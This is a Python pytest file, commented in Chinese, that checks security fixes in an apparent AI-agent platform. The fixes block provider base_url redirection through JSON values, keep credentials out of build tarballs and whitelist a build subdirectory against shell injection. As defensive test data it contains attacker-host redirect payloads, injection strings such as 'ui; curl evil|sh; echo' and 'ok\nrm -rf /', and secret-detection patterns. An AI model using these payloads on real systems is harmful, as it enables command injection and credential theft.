"""26 号文 S-1/S-2：出站端点 admin 闸的【值层】绕过治本。

病灶：B8-F2 造了 `_reject_endpoint_keys` 单一 chokepoint（设计正确），但它是**键名**
分类器，而权威真相源把端点藏在**值**里：
  - `SWARM_MODEL_PROVIDERS` 是 JSON，每个 provider 的 base_url 由请求体控制，键名不匹配
    任何 `*_URL/_URI/_ENDPOINT/_PROXY_BASE` 后缀 → 直接落盘；而 settings 的
    `_effective_providers` 以该 JSON 为准，`_resolve_api_key` 还会把 secret_store 解密的
    真 key 挂到攻击者 base_url 上 → 全部 provider 凭据 + 每一次 prompt（含客户源码）外泄。
  - `SWARM_NOTIFY_CHANNELS` 同型（原注释自陈"闸对其 no-op"却没意识到那是绕过）。

当年的测试只测键名分类器、**从未构造 providers JSON**，所以 CRITICAL 原样存活。
本测试从攻击者视角构造真实载荷。
"""
from __future__ import annotations

import os

import pytest

from swarm.api.routers.config import _outbound_urls_in_value, _reject_endpoint_keys

_PROV_OK = '[{"id":"siliconflow","base_url":"https://api.siliconflow.cn/v1","api_key":""}]'
_PROV_ATTACK = '[{"id":"siliconflow","base_url":"http://attacker.example/v1","api_key":""}]'


@pytest.fixture
def _env(monkeypatch):
    monkeypatch.setenv("SWARM_MODEL_PROVIDERS", _PROV_OK)
    monkeypatch.setenv("SWARM_NOTIFY_CHANNELS",
                       '[{"type":"feishu","webhook_url":"https://open.feishu.cn/x"}]')
    return os.environ


def test_non_admin_cannot_redirect_provider_base_url_via_json(_env):
    """★核心攻击面★：非 admin（owner，持 config:write）经 JSON 值改 provider base_url。"""
    out = _reject_endpoint_keys({"SWARM_MODEL_PROVIDERS": _PROV_ATTACK}, False, "owner")
    assert "SWARM_MODEL_PROVIDERS" not in out, "值层绕过未被堵住＝凭据钓鱼/MITM 可利用"


def test_non_admin_cannot_redirect_notify_webhook_via_json(_env):
    """同族第二例：通知 webhook 重定向（任务/项目元数据外泄）。"""
    atk = '[{"type":"feishu","webhook_url":"http://evil.example/x"}]'
    out = _reject_endpoint_keys({"SWARM_NOTIFY_CHANNELS": atk}, False, "owner")
    assert "SWARM_NOTIFY_CHANNELS" not in out


def test_non_admin_may_change_non_url_fields(_env):
    """闸不能矫枉过正：同一 base_url 下改别的字段（模型列表等）仍允许。"""
    same_url = ('[{"id":"siliconflow","base_url":"https://api.siliconflow.cn/v1",'
                '"api_key":"","models":["m1","m2"]}]')
    out = _reject_endpoint_keys({"SWARM_MODEL_PROVIDERS": same_url}, False, "owner")
    assert "SWARM_MODEL_PROVIDERS" in out, "未改 URL 的正常配置变更不该被拒"


def test_admin_unaffected(_env):
    """admin 本就能改端点（等价于直接改 .env / 重启），闸只拦非 admin。"""
    out = _reject_endpoint_keys({"SWARM_MODEL_PROVIDERS": _PROV_ATTACK}, True, "admin")
    assert "SWARM_MODEL_PROVIDERS" in out


def test_flat_endpoint_key_still_rejected(_env):
    """键名闸不能因为加了值层就退化（当年那条防线仍要在）。"""
    out = _reject_endpoint_keys(
        {"SWARM_MODEL_SILICONFLOW_BASE_URL": "http://attacker.example/v1"}, False, "owner")
    assert out == {}


@pytest.mark.parametrize("value,expected", [
    ("https://a.example/v1", {"https://a.example/v1"}),
    ('[{"base_url":"https://a/x"},{"webhook_url":"http://b/y"}]', {"https://a/x", "http://b/y"}),
    ('{"nested":{"deep":{"endpoint":"https://c/z"}}}', {"https://c/z"}),
    ("plain-not-a-url", set()),
    ("", set()),
])
def test_outbound_url_extraction(value, expected):
    """抽取只认 `://` 不认字段名——避免又变成一张要逐个补的名单（键名闸就是这么漏的）。"""
    assert _outbound_urls_in_value(value) == expected


def test_malformed_json_with_url_is_fail_closed():
    """畸形 JSON 但含 URL → 整体当端点面（fail-closed），绝不因解析失败而放行。"""
    assert _outbound_urls_in_value('[{"base_url":"http://evil/x"') != set()


# ══════════════════════════════════════════════
# 26 号文 S-4/S-5：镜像密钥泄露 + Dockerfile RCE
# ══════════════════════════════════════════════

def test_source_tarball_excludes_credentials(tmp_path):
    """★不可撤销损失★：tarball → COPY 进镜像 → chmod 0777 → push 到无认证 registry
    → 固化为可复用模板。实测曾含 .env/.git-credentials/.npmrc/deploy.pem/id_rsa。"""
    import io
    import tarfile

    from swarm.worker.image_builder import _make_source_tarball
    (tmp_path / "src").mkdir()
    (tmp_path / "src" / "App.java").write_text("class App {}")
    (tmp_path / "migrations").mkdir()
    (tmp_path / "migrations" / "env.py").write_text("# alembic env")
    for f in (".env", ".git-credentials", ".npmrc", "deploy.pem", "id_rsa"):
        (tmp_path / f).write_text("SECRET=x")

    names = set(tarfile.open(fileobj=io.BytesIO(_make_source_tarball(tmp_path))).getnames())
    assert not (names & {".env", ".git-credentials", ".npmrc", "deploy.pem", "id_rsa"}), \
        f"敏感文件进了镜像 tarball：{names}"
    # 判据复用 ingest_guard，故一等源码不被误杀（env.py 是 alembic 每个项目都有的）
    assert "migrations/env.py" in names and "src/App.java" in names


@pytest.mark.parametrize("sub,ok", [
    ("ui", True), ("apps/web", True), ("my-app_v2", True),
    ("ui; curl evil|sh; echo", False),   # 构建期 RCE 载荷
    ("../../etc", False),                 # 路径逃逸
    ("/abs/path", False),                 # 绝对路径（会写到 /workspace 外）
    ("a$(id)b", False), ("ui&&whoami", False),
])
def test_dep_source_subdir_whitelist(sub, ok):
    """★构建期 RCE（S-5）★：dep_source 来自被扫描仓库的内容＝攻击者可控，未转义拼进
    `RUN` 会以 root 在构建机 dockerd 内执行且带完整出网。同文件另三处早已 shlex.quote，
    此处是唯一漏网。白名单是 fail-closed 方向（"允许什么"而非"禁止什么"）。"""
    from swarm.worker.image_builder import _SAFE_SUBDIR_RE
    assert bool(_SAFE_SUBDIR_RE.match(sub)) is ok, sub


# ══════════════════════════════════════════════
# 26 号文 S-6：密钥闸召回（三闸唯一共享事实源）
# ══════════════════════════════════════════════

@pytest.mark.parametrize("name,text", [
    ("OpenAI project key", "OPENAI_API_KEY=sk-proj-aaaaaaaaaaaaaaaaaaaaaaaaaaaa"),
    ("Anthropic", "ANTHROPIC_API_KEY=sk-ant-api03-bbbbbbbbbbbbbbbbbbbbbbbbbbbb"),
    ("OpenRouter", "key: sk-or-v1-cccccccccccccccccccccccccccccccc"),
    ("Groq", "GROQ=gsk_dddddddddddddddddddddddddddddddddddddddddd"),
    ("HuggingFace", "HF=hf_eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee"),
    ("xAI", "XAI=xai-ffffffffffffffffffffffffffffffffffffffffff"),
    ("加密私钥", "-----BEGIN ENCRYPTED PRIVATE KEY-----"),
])
def test_modern_provider_keys_are_critical(name, text):
    """此前召回率为 0：`sk-[a-zA-Z0-9]{20,}` 在第一个连字符处断裂，而 2024 起
    OpenAI 默认发的就是 sk-proj-，Anthropic/OpenRouter 同带连字符。"""
    from swarm.worker.security_scan import scan_text_for_secrets
    assert scan_text_for_secrets(text, min_severity="critical"), f"{name} 未被 CRITICAL 捕获"


@pytest.mark.parametrize("text", [
    "spring.datasource.password=Passw0rd123",        # properties（RuoYi 的栈）
    "  password: Adm1nP@ssw0rd",                      # YAML
    "export DB_PASSWORD=SuperSecret123",              # shell（下划线让 \b 不成立，曾整类漏）
    "jdbc:mysql://h:3306/db?user=root&password=SuperSecret123",
])
def test_unquoted_credentials_are_caught(text):
    """★Java/Spring 最常见的凭据写法★：Generic 规则强制要求引号 → 全漏。
    原事故文件 .env 是靠文件名闸拦住的，换个文件名同类事故即复发。"""
    from swarm.worker.security_scan import scan_text_for_secrets
    assert scan_text_for_secrets(text), f"无引号凭据未被捕获: {text}"


def test_quoting_is_not_an_escape_hatch():
    """★加引号不得成为绕过 CRITICAL 的手段★：原 AWS 规则撞引号即失配，回落到 HIGH 档
    （默认 block_severity=critical 下不阻断）。而 YAML/JSON/Java 里带引号才是主流。"""
    from swarm.worker.security_scan import scan_text_for_secrets
    bare = "aws_secret_access_key=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
    quoted = 'aws_secret_access_key = "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"'
    assert scan_text_for_secrets(bare, min_severity="critical")
    assert scan_text_for_secrets(quoted, min_severity="critical"), "加引号即逃逸"


@pytest.mark.parametrize("text", [
    "password=password,",                 # 变量传参
    "api_key = resolve_credential(",      # 函数调用
    "DB_PASSWORD=${SECRET}",              # 占位符
    "api_key: {{ vault_key }}",           # 模板
    "# password: changeme",               # 注释
])
def test_unquoted_rule_does_not_flag_normal_code(text):
    """扩召回的最大风险是误报淹没真信号。判据收到"值必须含数字或特殊符号"——
    实测全仓非 test 的 .py 文件误报归零，而真凭据形态全部保留。"""
    from swarm.worker.security_scan import _SECRET_PATTERNS
    pat = dict((n, p) for n, p, _ in _SECRET_PATTERNS)["Unquoted secret assignment"]
    assert not pat.search(text), f"正常代码被误报: {text}"


# ══════════════════════════════════════════════
# R2 复核整改：编码层绕过 / git 主路径 / 拒绝不得伪装成功
# ══════════════════════════════════════════════

@pytest.mark.parametrize("payload,desc", [
    (r'[{"base_url":"https:\/\/evil.example\/v1"}]', "JSON 转义斜杠 \\/"),
    (r'[{"base_url":"https://evil.example/v1"}]', "unicode 转义冒号"),
    (r'[{"base_url":"https://evil.example/v1"}]', "unicode 转义斜杠"),
    ('{"http://evil.example/x":"v"}', "URL 出现在 dict 的 key 上"),
])
def test_gate_not_bypassed_by_encoding(payload, desc):
    """★闸的判据层必须与攻击者的编码层对齐（R2 复核 CRITICAL-1）★
    初版在 json.loads【之前】判 `"://" not in s` 就短路——而 JSON 允许 \\/ 与 \\uXXXX，
    转义后原始文本里没有 `://` → 返回空集 → 整键放行。复核已端到端实证：转义载荷落盘后
    _effective_providers() 吐出的就是攻击者 base_url。"""
    assert _outbound_urls_in_value(payload), f"{desc} 绕过了闸"


def test_source_tarball_excludes_credentials_on_git_path(tmp_path):
    """★git archive 是【主路径】，真实场景全走它（R2 复核 CRITICAL/HIGH-1）★
    初版剔除只加在工作区扫描【回退】分支，而任何 git 仓库（E2E 基线 RuoYi、worker clone
    出的客户仓库）都走 git archive 并提前 return。当时的测试用 tmp_path（非 git 仓库）
    必然走回退分支 → 恒绿，给出了与实际防护面【相反】的保证。"""
    import io
    import subprocess
    import tarfile

    from swarm.worker.image_builder import _make_source_tarball

    (tmp_path / "src").mkdir()
    (tmp_path / "src" / "A.java").write_text("class A {}")
    for f in (".env", "id_rsa", ".npmrc", "deploy.pem"):
        (tmp_path / f).write_text("SECRET=x")
    subprocess.run(["git", "init", "-q", "."], cwd=tmp_path, check=True, capture_output=True)
    subprocess.run(["git", "add", "-A", "-f"], cwd=tmp_path, check=True, capture_output=True)
    subprocess.run(["git", "-c", "user.email=t@t", "-c", "user.name=t",
                    "commit", "-qm", "init"], cwd=tmp_path, check=True, capture_output=True)

    names = set(tarfile.open(fileobj=io.BytesIO(_make_source_tarball(tmp_path))).getnames())
    assert (tmp_path / ".git").exists(), "本用例必须走 git archive 主路径"
    assert not (names & {".env", "id_rsa", ".npmrc", "deploy.pem"}), \
        f"git archive 主路径未剔除凭据：{names}"
    assert "src/A.java" in names


def test_rejection_is_not_disguised_as_success():
    """★拒绝不能伪装成成功（B8-F2 当年的对抗复核原话，R2 复核 HIGH-2 指出它被打破）★
    被值层闸拒的键此前仍出现在 `updated_keys` 里、响应 status=ok，用户以为改了实际没改。
    现在两个端点在裁决后被拒即 403 并明示被拒键。"""
    import inspect

    from swarm.api.routers import config as _cfg
    src = inspect.getsource(_cfg)
    assert "被拒键" in src, "被拒必须明示键名"
    # 裁决必须发生在 set_secret 副作用之前（否则非 admin 可静默销毁 provider 凭据）
    i_gate = src.index("_mp_kept = _reject_endpoint_keys")
    i_persist = src.index("_persist_env_updates, update_map, is_admin=_mp_is_admin")
    assert i_gate < i_persist


def test_value_gate_is_directional_not_set_inequality(monkeypatch):
    """★只拒"引入旧集合里没有的 host"，别把删除/改非 URL 字段一并拒掉（R2 复核 HIGH）★
    初版判"新旧集合不等"，于是非 admin owner 删一个已下线 provider 也被拒——那没有任何
    重定向风险。闸过宽的代价不是"更安全"，是使用者绕开它。"""
    old = '[{"name":"a","base_url":"https://api.a.com/v1"},{"name":"b","base_url":"https://api.b.com/v1"}]'
    monkeypatch.setenv("SWARM_MODEL_PROVIDERS", old)

    # 删掉 b（URL 集合收缩）→ 放行
    shrink = '[{"name":"a","base_url":"https://api.a.com/v1"}]'
    assert _reject_endpoint_keys({"SWARM_MODEL_PROVIDERS": shrink}, False, "owner")

    # 改非 URL 字段（沿用旧 host）→ 放行
    same = '[{"name":"a","base_url":"https://api.a.com/v1","model":"新模型"},{"name":"b","base_url":"https://api.b.com/v1"}]'
    assert _reject_endpoint_keys({"SWARM_MODEL_PROVIDERS": same}, False, "owner")

    # 引入新 host → 仍然拒（本闸的唯一目的）
    evil = old.replace("api.b.com", "evil.example")
    assert not _reject_endpoint_keys({"SWARM_MODEL_PROVIDERS": evil}, False, "owner")
    # admin 全放行
    assert _reject_endpoint_keys({"SWARM_MODEL_PROVIDERS": evil}, True, "admin")


def test_safe_subdir_regex_rejects_trailing_newline_injection():
    """★`$` 匹配行尾换行之前，`\\Z` 才是真串尾（R2 复核 MEDIUM）★
    该值随后拼进沙箱 shell 命令，`ok\\nrm -rf /` 过了 `$` 版正则就是一条独立命令。"""
    from swarm.worker.image_builder import _SAFE_SUBDIR_RE
    assert _SAFE_SUBDIR_RE.match("svc/api")
    assert not _SAFE_SUBDIR_RE.match("ok\nrm -rf /")
    assert not _SAFE_SUBDIR_RE.match("../etc")
    assert not _SAFE_SUBDIR_RE.match("/abs")


def test_get_secret_caches_true_miss(monkeypatch):
    """★真 miss 是最常见路径，不缓存 = 每次调用一次 PG 往返（R2 复核 MEDIUM）★
    实测 71 次 get_config = 213 次往返，dispatch 从 0.08s 涨到 0.6s。"""
    from swarm.config import secret_store as ss

    ss._cache.clear()
    calls = {"n": 0}

    class _Cur:
        def __enter__(self): return self
        def __exit__(self, *a): return False
        def execute(self, *a): calls["n"] += 1
        def fetchone(self): return None

    class _Conn:
        def __enter__(self): return self
        def __exit__(self, *a): return False
        def cursor(self): return _Cur()

    monkeypatch.setattr(ss, "_get_conn", lambda *a, **k: _Conn())
    assert ss.get_secret("SWARM_不存在的键") is None
    assert ss.get_secret("SWARM_不存在的键") is None
    assert calls["n"] == 1, f"真 miss 未进缓存，第二次又打了 PG（共 {calls['n']} 次）"
    ss._cache.clear()


def test_image_tarball_gate_keeps_build_toolchain_hidden_dirs():
    """★复用单一事实源必须连它的【消费契约】一起读（R2 复核 MEDIUM，第二例）★
    tarball 剔除初版直接调 `reject_reason_by_name`（知识库入库闸），它会拒隐藏【目录】——
    那是"隐藏目录是噪声"的知识库语义。对构建 tarball，隐藏目录可能是工具链本体：
    `.mvn/wrapper/*`（mvnw）与 `.yarn/releases/*`（yarn Berry）被剔 → 沙箱构建失败，
    报错指向"找不到 wrapper jar"，与"tarball 少打文件"毫无关联；且只打击这两个生态
    = 违反多栈中立。故按契约分函数：credential_reject_reason 只判凭据。"""
    from swarm.worker.image_builder import _sensitive_reject_reason as g

    for keep in (".mvn/wrapper/maven-wrapper.properties", ".yarn/releases/yarn-4.cjs",
                 ".gradle/wrapper/gradle-wrapper.properties", ".github/workflows/ci.yml",
                 "src/main/java/A.java"):
        assert g(keep) is None, f"{keep} 是构建/源码内容，不该被剔除"
    for drop in (".env", "id_rsa", ".npmrc", "deploy.pem", ".ssh/known_hosts",
                 ".aws/credentials", ".docker/config.json", ".kube/config"):
        assert g(drop), f"{drop} 是凭据，必须剔除"
